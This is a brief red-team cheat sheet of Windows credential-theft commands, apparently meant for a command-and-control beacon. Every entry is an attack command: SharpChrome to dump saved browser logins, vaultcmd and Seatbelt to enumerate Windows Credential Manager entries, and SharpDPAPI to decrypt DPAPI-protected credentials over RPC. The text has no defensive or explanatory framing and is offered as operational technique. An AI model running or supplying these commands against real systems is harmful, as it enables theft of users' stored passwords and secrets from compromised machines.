
#### OPSEC Methods
Browser credentials
```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

Windows Credential Manager
```powershell
run vaultcmd /listcreds:"Windows Credentials" /all
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

